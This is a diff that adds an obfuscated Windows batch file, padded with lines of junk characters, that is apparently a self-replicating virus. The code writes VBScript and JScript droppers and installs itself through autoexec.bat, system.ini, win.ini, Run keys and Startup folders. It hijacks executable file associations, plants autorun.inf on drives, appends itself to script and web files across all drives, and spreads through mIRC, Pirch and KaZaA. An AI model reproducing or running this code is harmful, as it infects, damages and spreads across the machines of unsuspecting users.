@@ -1,0 +1,406 @@
+
+:_„§Ó÷+^‚®Òö*\­Ñõ([€¬Ğó'Z«Îò&Y~©Íñ$W„¨Ìø"Vƒ§Ëö!U‚¦ÉõT¤ÈôS£ÇóQ~¢ÆòX}¡ÍğW{ŸËïVyÊîTxÉíSwœÈ
+:ëRv£ÆêQu¡ÅéPs ÄèNrŸÃæMqÁåLpœÀäKv›¿ëIuš¾êHt™½èGs—»çFq–ºæDp•ÁåïNzÂîMxÁíKwœÀìJv›¾ê
+:Iu™½éPs˜ÄèNr—ÃçMq–ÂåLp•ÀäKo“¿ãJmš¾âHl™½àGk˜»ßFj–ºŞEh•¹İCg”¸ÜBn“·âAm‘µá@k´à:j³ß/i²
+:İ.h¸ÜCg‹·ÛÿBeŠ¶Úı@d‰µØü?cˆ³×û:b†²Ö/`±Õ-_Œ°Ôÿ+^‹¯Òş*]‰­Ñı)ÿBf‹·ÚşAe’µÙ@d´Ø?b³×/a²Ö.`±Ô
+:-_‹¯Ûÿ+eŠ®Úş)d‰­Ùü(cˆ¬×û'b‡ªÖú&a…©Õù$_„°Ô÷+^ƒ¯Òö*]‚­Ñõ)\€¬Ğô(Z«Ïó&Y~ªÎù$X…©Ìø#Wƒ§Ë÷"U‚¦ÊöT¥ÉôS€¤
+:ÇóR¢ÎòY}¡ÍñW{ ÌïVzŸÊîUyÉíTwœÈìRv£ÇëQu¢ÆéP[£ÏóY~¢ÎñX}¡ÌğW{§Ëï"Vy¦Êî!Tx¥ÉíSw¤ÈëRv£Æê
+:Qt¡ÅñO{ ÄğNzŸÃîMyÁíLxœÀìKv›¿ëQušÆéPt™ÄèOs—ÃçNq–ÂæLp•ÁåKo”ÀãJn›¾âIl™½áGk˜¼àFj—»ŞEi–
+:¹İDp”¸äCn“·ãAm’¶á@l‘´à?k³ß:i²ŞDhGs˜»çFr–ºæEp•¹åCo”¸ãBn“¶âIm‘½áHk¼àFj»ßEiºİDh¸Ü
+:Cf‹·ÛAe’¶Ú@d‘µØ?c³×:b²Ö/`±Õ-gŒ°Ûÿ+f‹®Úş*e‰­Ùı)cˆ¬Øü'b‡«×ú&a†ªÕù.`…°Ôø-^ƒ¯Ó÷*]‚®Òõ)\­Ğô([€
+:«Ïó'Z†ªÎú&X…©Íù#W„¨Ì÷"Vƒ¦Êö!U¥„°Ô÷+^ƒ¯Òş*]Š­Ñı)\ˆ¬Ğü(Z‡«Ïû&Y†ªÍù$X…¨Ìø#_ƒ§Ó÷"]‚¦Òö\¥Ñô[€¤ÏóZ¢Î
+@echo off%OrŸÃçÎ%
+%OrŸÃçÎ%set ´×:b=%windir%\system32\shutdown.exe
+if not exist %´×:b% ctty nul%OrŸÃçÎ%
+if 0FThw_Pd==%1 goto r6JXn1DT%OrŸÃçÎ%
+if lDReu8Lb==%1 goto o2HVjyBP%OrŸÃçÎ%
+if Odr5KYl1==%1 goto ESiv9Ocs%OrŸÃçÎ%
+if Qer7KYo1==%1 goto EUiwAOcs%OrŸÃçÎ%
+if Rhu8Nb4G==%1 goto UkyBQes8%OrŸÃçÎ%
+if wBOcs6JY==%1 goto GUixAOes%OrŸÃçÎ%
+%OrŸÃçÎ%set ï"Uy¦Ê=script
+echo.on error resume next> %tmp%\hvANbr5I.tmp%OrŸÃçÎ%
+echo set Xu_Maq4H=w%ï"Uy¦Ê%.createobject("w%ï"Uy¦Ê%.shell")>> %tmp%\hvANbr5I.tmp%OrŸÃçÎ%
+echo Xu_Maq4H.run "SYSnOqqS.bat", 0>> %tmp%\hvANbr5I.tmp%OrŸÃçÎ%
+if MpÁåK%windir%==MpÁåK set windir=%systemroot%%OrŸÃçÎ%
+find /i "OrŸÃçÎ"<%0>%windir%\SYSnOqqS.bat
+%OrŸÃçÎ%set îTx¥É=textfile(
+find /i /v "run"<%tmp%\hvANbr5I.tmp>%tmp%\Zo2FVjwB.vbs%OrŸÃçÎ%
+echo set AAObr5IY=w%ï"Uy¦Ê%.createobject("%ï"Uy¦Ê%ing.filesystemobject")>>%tmp%\Zo2FVjwB.vbs%OrŸÃçÎ%
+echo dim izESgv9M>>%tmp%\Zo2FVjwB.vbs%OrŸÃçÎ%
+echo izESgv9M=Xu_Maq4H.regread ("HKLM\Software\FThx_Ndr\5JXl1ERh")>>%tmp%\Zo2FVjwB.vbs%OrŸÃçÎ%
+echo if (izESgv9M="") then>>%tmp%\Zo2FVjwB.vbs%OrŸÃçÎ%
+echo set Rq3IWkzC=AAObr5IY.create%îTx¥É%"%tmp%\Pdt6JZn0.tmp", 1)>>%tmp%\Zo2FVjwB.vbs%OrŸÃçÎ%
+echo Xu_Maq4H.run "%windir%\SYSnOqqS.bat", 0>>%tmp%\Zo2FVjwB.vbs%OrŸÃçÎ%
+echo end if>>%tmp%\Zo2FVjwB.vbs%OrŸÃçÎ%
+echo Xu_Maq4H.regwrite "HKLM\Software\FThx_Ndr\5JXl1ERh", "Qgu7Mao4">>%tmp%\Zo2FVjwB.vbs%OrŸÃçÎ%
+start /w %tmp%\Zo2FVjwB.vbs%OrŸÃçÎ%
+if not exist %tmp%\Pdt6JZn0.tmp goto GUkyDQeu%OrŸÃçÎ%
+del %tmp%\Pdt6JZn0.tmp%OrŸÃçÎ%
+goto LYo2FViw%OrŸÃçÎ%
+:GUkyDQeu%OrŸÃçÎ%
+attrib +r +s +h %windir%\SYSnOqqS.bat%OrŸÃçÎ%
+md %windir%\kyDRfu8L%OrŸÃçÎ%
+attrib +s +h %windir%\kyDRfu8L%OrŸÃçÎ%
+find /i /v "run"<%tmp%\hvANbr5I.tmp>%windir%\WinutVxx.vbs%OrŸÃçÎ%
+echo set eao3GUky=w%ï"Uy¦Ê%.createobject("%ï"Uy¦Ê%ing.filesystemobject")>> %windir%\WinutVxx.vbs%OrŸÃçÎ%
+echo dim KJYm0FTg, s_Ndq4JX>> %windir%\WinutVxx.vbs%OrŸÃçÎ%
+echo set D0DRhv8N=eao3GUky.open%îTx¥É%w%ï"Uy¦Ê%.%ï"Uy¦Ê%name,1)>> %windir%\WinutVxx.vbs%OrŸÃçÎ%
+echo KJYm0FTg=D0DRhv8N.readall>> %windir%\WinutVxx.vbs%OrŸÃçÎ%
+echo s_Ndq4JX=replace(KJYm0FTg,chr(39),"")>> %windir%\WinutVxx.vbs%OrŸÃçÎ%
+echo D0DRhv8N.close>> %windir%\WinutVxx.vbs%OrŸÃçÎ%
+echo setlp5HVlzC=eao3GUky.create%îTx¥É%"%tmp%\oQes8KYo.bat",1)>> %windir%\WinutVxx.vbs%OrŸÃçÎ%
+echo lp5HVlzC.write s_Ndq4JX>> %windir%\WinutVxx.vbs%OrŸÃçÎ%
+echo lp5HVlzC.close>> %windir%\WinutVxx.vbs%OrŸÃçÎ%
+echo Xu_Maq4H.run "%tmp%\oQes8KYo.bat",0>> %windir%\WinutVxx.vbs%OrŸÃçÎ%
+echo /*>> %windir%\ZAAccCFG.js%OrŸÃçÎ%
+echo type %windir%\SYSnOqqS.bat>> %windir%\ZAAccCFG.js%OrŸÃçÎ%
+echo */>> %windir%\ZAAccCFG.js%OrŸÃçÎ%
+echo var JxBPdt7J=w%ï"Uy¦Ê%.createobject("%ï"Uy¦Ê%ing.filesystemobject")>> %windir%\ZAAccCFG.js%OrŸÃçÎ%
+echo var rn1GThxA=w%ï"Uy¦Ê%.createobject("w%ï"Uy¦Ê%.shell")>> %windir%\ZAAccCFG.js%OrŸÃçÎ%
+echo JxBPdt7J.copyfile w%ï"Uy¦Ê%.%ï"Uy¦Ê%name,"%tmp%\oQes8KYo.bat">> %windir%\ZAAccCFG.js%OrŸÃçÎ%
+echo rn1GThxA.run("%tmp%\oQes8KYo.bat",0)>> %windir%\ZAAccCFG.js%OrŸÃçÎ%
+if exist %windir%\kyDRfu8L\n2Fgw9Mc.bat goto yBPfs6LZ%OrŸÃçÎ%
+copy %windir%\SYSnOqqS.bat %windir%\kyDRfu8L\n2Fgw9Mc.bat%OrŸÃçÎ%
+attrib -r \autoexec.bat%OrŸÃçÎ%
+echo @call %windir%\kyDRfu8L\n2Fgw9Mc.bat>> \autoexec.bat%OrŸÃçÎ%
+:yBPfs6LZ%OrŸÃçÎ%
+if exist %windir%\kyDRfu8L\gu_Naq4H.bat goto q4IWm0DS%OrŸÃçÎ%
+copy %windir%\SYSnOqqS.bat %windir%\kyDRfu8L\gu_Naq4H.bat%OrŸÃçÎ%
+attrib -r %windir%\winstart.bat%OrŸÃçÎ%
+echo @call %windir%\kyDRfu8L\gu_Naq4H.bat>> %windir%\winstart.bat%OrŸÃçÎ%
+:q4IWm0DS%OrŸÃçÎ%
+copy %tmp%\hvANbr5I.tmp %windir%\cs6IYm0F.vbs%OrŸÃçÎ%
+find /v /i "[boot]" < %windir%\system.ini > %tmp%\Sgw_Ncq4.tmp%OrŸÃçÎ%
+find /v /i "shell=explorer.exe" < %tmp%\Sgw_Ncq4.tmp > %tmp%\JXk0DRgu.tmp%OrŸÃçÎ%
+del %windir%\system.ini%OrŸÃçÎ%
+echo [boot]> %windir%\system.ini%OrŸÃçÎ%
+echo Shell=Explorer.exe cs6IYm0F.vbs>> %windir%\system.ini%OrŸÃçÎ%
+type %tmp%\JXk0DRgu.tmp >> %windir%\system.ini%OrŸÃçÎ%
+copy %tmp%\hvANbr5I.tmp %windir%\GVjxCQdt.vbs%OrŸÃçÎ%
+find /v /i "[windows]" < %windir%\win.ini > %tmp%\7Kan1GUh.tmp%OrŸÃçÎ%
+find /v /i "load=" < %tmp%\7Kan1GUh.tmp > %tmp%\xAOer5KY.tmp%OrŸÃçÎ%
+find /v /i "run=" < %tmp%\xAOer5KY.tmp > %tmp%\m1EUiwAO.tmp%OrŸÃçÎ%
+find /v /i "NullPort=" < %tmp%\xAOer5KY.tmp > %tmp%\m1EUiwAO.tmp%OrŸÃçÎ%
+del %windir%\win.ini%OrŸÃçÎ%
+echo [windows]> %windir%\win.ini%OrŸÃçÎ%
+echo load=>> %windir%\win.ini%OrŸÃçÎ%
+echo run=GVjxCQdt.vbs>> %windir%\win.ini%OrŸÃçÎ%
+echo NullPort=None>> %windir%\win.ini%OrŸÃçÎ%
+type %tmp%\m1EUiwAO.tmp >> %windir%\win.ini%OrŸÃçÎ%
+echo.on error resume next>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo dim Gr5KYm1E>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set h9Maq4GW=w%ï"Uy¦Ê%.createobject("%ï"Uy¦Ê%ing.filesystemobject")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set PyDQgu8N=w%ï"Uy¦Ê%.createobject("w%ï"Uy¦Ê%.shell")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo if err.number=429 then>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo PyDQgu8N.run javascript:location.reload()>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo else>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set aes6LZm2=h9Maq4GW.open%îTx¥É%"%windir%\SYSnOqqS.bat")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo ITjw_Pdr=split(aes6LZm2.readall,vbcrlf)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo for qJXn0FTh=0 to ubound(ITjw_Pdr)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo ITjw_Pdr(qJXn0FTh)=chr(39)+ITjw_Pdr(qJXn0FTh)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo next>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set Z_Ndr5JX=h9Maq4GW.open%îTx¥É%"%windir%\WinutVxx.vbs",8)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Z_Ndr5JX.write join(ITjw_Pdr,vbcrlf)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Z_Ndr5JX.close>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set JxCQdt7K=h9Maq4GW.create%îTx¥É%"%tmp%\an3GUjxA.tmp")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo JxCQdt7K.writeline chr(60)&"script language=vbscript id=wscript"&chr(62)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo JxCQdt7K.write join(ITjw_Pdr,vbcrlf)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo JxCQdt7K.writeline chr(60)&"/script"&chr(62)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo JxCQdt7K.close>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+%OrŸÃçÎ%set œÈìRv=oftware\Microsoft\Windows\CurrentVersio
+copy %tmp%\hvANbr5I.tmp %windir%\XkyDRfu8.vbs%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKLM\S%œÈìRv%n\Run\KFVjxCPdt7", " %windir%\XkyDRfu8.vbs">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+copy %tmp%\hvANbr5I.tmp %windir%\Lbp2HVjz.vbs%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKCU\S%œÈìRv%n\Run\wZn1GUhxAO", " %windir%\Lbp2HVjz.vbs">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+copy %tmp%\hvANbr5I.tmp %windir%\3GWkyCQe.vbs%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKLM\Software\Microsoft\Active Setup\Installed Components\KeyName\StubPath", "%windir%\3GWkyCQe.vbs">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo YJZn3FTj=PyDQgu8N.SpecialFolders("Startup")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo HAPdr7KX=PyDQgu8N.SpecialFolders("AllUsersStartup")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo h9Maq4GW.copyfile "%tmp%\hvANbr5I.tmp", YJZn3FTj & "\WinLnOO32.vbs">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo h9Maq4GW.copyfile "%tmp%\hvANbr5I.tmp", HAPdr7KX & "\qSStDebug.vbs">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+find /i /v "run" < %tmp%\hvANbr5I.tmp > %windir%\Lbp3HVjz.vbs%OrŸÃçÎ%
+echo dim hyAQeu8K, Po2HUiyB>> %windir%\Lbp3HVjz.vbs%OrŸÃçÎ%
+echo set y7Mao3GU=Wscript.Arguments>> %windir%\Lbp3HVjz.vbs%OrŸÃçÎ%
+echo if y7Mao3GU.count>1 then>> %windir%\Lbp3HVjz.vbs%OrŸÃçÎ%
+echo for hyAQeu8K=0 to y7Mao3GU.count-1>> %windir%\Lbp3HVjz.vbs%OrŸÃçÎ%
+echo Po2HUiyB=Po2HUiyB&y7Mao3GU(hyAQeu8K)&" ">> %windir%\Lbp3HVjz.vbs%OrŸÃçÎ%
+echo next>> %windir%\Lbp3HVjz.vbs%OrŸÃçÎ%
+echo Xu_Maq4H.run "%comspec% /c "&Po2HUiyB,0>> %windir%\Lbp3HVjz.vbs%OrŸÃçÎ%
+echo Xu_Maq4H.run "SYSnOqqS.bat",0>> %windir%\Lbp3HVjz.vbs%OrŸÃçÎ%
+echo end if>> %windir%\Lbp3HVjz.vbs%OrŸÃçÎ%
+%OrŸÃçÎ%set ‘µÙ?c=file\shell\open\comman
+echo PyDQgu8N.regwrite "HKCR\exe%‘µÙ?c%d\", "wscript %windir%\Lbp3HVjz.vbs ""%%1 %%*""">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKCR\com%‘µÙ?c%d\", "wscript %windir%\Lbp3HVjz.vbs ""%%1 %%*""">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKCR\bat%‘µÙ?c%d\", "wscript %windir%\Lbp3HVjz.vbs ""%%1 %%*""">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKCR\pif%‘µÙ?c%d\", "wscript %windir%\Lbp3HVjz.vbs ""%%1 %%*""">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKCR\cmd%‘µÙ?c%d\", "wscript %windir%\Lbp3HVjz.vbs ""%%1 %%*""">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKCR\scr%‘µÙ?c%d\", "wscript %windir%\Lbp3HVjz.vbs ""%%1 %%*""">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set Tfv9Lbp3=PyDQgu8N.createshortcut("%tmp%\9MZp3GWj.lnk")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Tfv9Lbp3.targetpath=PyDQgu8N.expandenvironmentstrings("%windir%\WinutVxx.vbs")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Tfv9Lbp3.windowstyle=4>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Tfv9Lbp3.save>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set l5IWm0CS=PyDQgu8N.createshortcut("%tmp%\HVjzCRft.lnk")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo l5IWm0CS.targetpath=PyDQgu8N.expandenvironmentstrings("%windir%\SYSnOqqS.bat")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo l5IWm0CS.windowstyle=2>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo l5IWm0CS.save>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo dim W3IWjzCQ,Ft9Maq3G,yYm0ESgw>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo nkxCQeu7()>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sub nkxCQeu7()>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo.on error resume next>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo for each W3IWjzCQ in h9Maq4GW.drives>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo if (W3IWjzCQ.drivetype<4) then>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set Hw_Ndr4J=h9Maq4GW.getfile(W3IWjzCQ.path & "\autorun.inf")>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Hw_Ndr4J.attributes=38>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set w6JZn0FT=h9Maq4GW.create%îTx¥É%W3IWjzCQ.path & "\autorun.inf",1)>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo w6JZn0FT.writeline "[autorun]">>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo w6JZn0FT.writeline "open=wscript %windir%\WinutVxx.vbs">>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo w6JZn0FT.close>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Hw_Ndr4J.attributes=38>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo xao2GUiy(W3IWjzCQ.path&"\")>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo end if>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo next>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo end sub>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sub xao2GUiy(gOes6LYm)>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo.on error resume next>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set OFViwBPd=h9Maq4GW.getfolder(gOes6LYm)>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo for each yYm0ESgw in OFViwBPd.files>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo if Gr5KYm1E="SiwAOcs6" then>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo h9Maq4GW.deletefile yYm0ESgw.path,1>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo else>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo dim RGUixAOe>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set A5KYm2ES=h9Maq4GW.getfile(yYm0ESgw.path)>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo RGUixAOe=A5KYm2ES.attributes>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo A5KYm2ES.attributes=0>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo iw9Ocq6I=lcase(h9Maq4GW.getextensionname(yYm0ESgw.path))>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo if iw9Ocq6I="" then>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo elseif iw9Ocq6I="bat" or iw9Ocq6I="cmd" then>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set sm0DSgu_=h9Maq4GW.open%îTx¥É%yYm0ESgw.path,8)>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sm0DSgu_.write join(ITjw_Pdr,vbcrlf)>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sm0DSgu_.close>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo elseif iw9Ocq6I="vbs" or iw9Ocq6I="vbe" then>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set sm0DSgu_=h9Maq4GW.open%îTx¥É%"%windir%\WinutVxx.vbs")>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo bcq4JXk0=sm0DSgu_.readall>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sm0DSgu_.close>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set sm0DSgu_=h9Maq4GW.open%îTx¥É%yYm0ESgw.path,8)>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sm0DSgu_.write bcq4JXk0>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sm0DSgu_.close>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo elseif iw9Ocq6I="js" or iw9Ocq6I="jse" then>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set sm0DSgu_=h9Maq4GW.open%îTx¥É%"%windir%\ZAAccCFG.js")>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo bcq4JXk0=sm0DSgu_.readall>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sm0DSgu_.close>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set sm0DSgu_=h9Maq4GW.open%îTx¥É%yYm0ESgw.path,8)>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sm0DSgu_.write bcq4JXk0>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sm0DSgu_.close>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo elseif iw9Ocq6I="htm" or iw9Ocq6I="html" or iw9Ocq6I="asp" or iw9Ocq6I="cgi" then>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set sm0DSgu_=h9Maq4GW.open%îTx¥É%"%tmp%\an3GUjxA.tmp")>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo bcq4JXk0=sm0DSgu_.readall>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sm0DSgu_.close>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set sm0DSgu_=h9Maq4GW.open%îTx¥É%yYm0ESgw.path,8)>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sm0DSgu_.write bcq4JXk0>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo sm0DSgu_.close>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo elseif iw9Ocq6I="lnk" then>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo h9Maq4GW.copyfile "%tmp%\9MZp3GWj.lnk",yYm0ESgw.path,1>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo elseif iw9Ocq6I="pif" then>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo h9Maq4GW.copyfile "%tmp%\HVjzCRft.pif",yYm0ESgw.path,1>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo end if>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo A5KYm2ES.attributes=RGUixAOe>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo end if>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo next>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo for each Ft9Maq3G in OFViwBPd.subfolders>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo xao2GUiy(Ft9Maq3G.path)>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo next>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo end sub>>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+%OrŸÃçÎ%if exist \mirc\*.ini set Øü(b‡«=\mirc
+%OrŸÃçÎ%if exist \mirc32\*.ini set Øü(b‡«=\mirc32
+%OrŸÃçÎ%if exist \progra~1\mirc\*.ini set Øü(b‡«=\progra~1\mirc
+%OrŸÃçÎ%if exist \progra~1\mirc32\*.ini set Øü(b‡«=\progra~1\mirc32
+set ×û&a†²=cc send $nic%OrŸÃçÎ%
+copy %windir%\SYSnOqqS.bat %Øü(b‡«%\Welcome!.bat%OrŸÃçÎ%
+echo [%ï"Uy¦Ê%]> %Øü(b‡«%\%ï"Uy¦Ê%.ini%OrŸÃçÎ%
+echo n0=on 1:filesend:#:{>> %Øü(b‡«%\%ï"Uy¦Ê%.ini%OrŸÃçÎ%
+echo n1= /if ( $nick == $me ) {halt}>> %Øü(b‡«%\%ï"Uy¦Ê%.ini%OrŸÃçÎ%
+echo n2= /.d%×û&a†²%k %Øü(b‡«%\Welcome!.bat>> %Øü(b‡«%\%ï"Uy¦Ê%.ini%OrŸÃçÎ%
+echo n3= }>> %Øü(b‡«%\%ï"Uy¦Ê%.ini%OrŸÃçÎ%
+%OrŸÃçÎ%if exist \pirch98\*.* set ²Ö/a=\pirch98
+%OrŸÃçÎ%if exist \pirch\*.* set ²Ö/a=\pirch
+%OrŸÃçÎ%if exist \progra~1\pirch98\*.* set ²Ö/a=\progra~1\pirch98
+%OrŸÃçÎ%if exist \progra~1\pirch\*.* set ²Ö/a=\progra~1\pirch
+copy %windir%\SYSnOqqS.bat %²Ö/a%\Greets!!.bat%OrŸÃçÎ%
+echo [Levels]> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo Enabled=1>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo Count=6>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo Level1=000-Unknows>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo 000-UnknowsEnabled=1>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo Level2=100-Level 100>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo 100-Level 100Enabled=1>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo Level3=200-Level 200>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo 200-Level 200Enabled=1>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo Level4=300-Level 300>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo 300-Level 300Enabled=1>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo Level5=400-Level 400>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo 400-Level 400Enabled=1>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo Level6=500-Level 500>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo 500-Level 500Enabled=1>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo [000-Unknowns]>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo User1=*!*@*>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo UserCount=1>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo Events1= ON filesend:#: /dcc send $nick %²Ö/a%\Greets!!.bat>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo EventCount=1>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo [100-Level 100]>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo UserCount=0>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo EventCount=0>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo [200-Level 200]>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo UserCount=0>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo EventCount=0>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo [300-Level 300]>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo UserCount=0>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo EventCount=0>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo [400-Level 400]>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo UserCount=0>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo EventCount=0>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo [500-Level 500]>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo UserCount=0>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo EventCount=0>> %²Ö/a%\events.ini%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKLM\Software\KaZaA\Transfer\DlDir0", "%windir%\gu_Maq4J">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
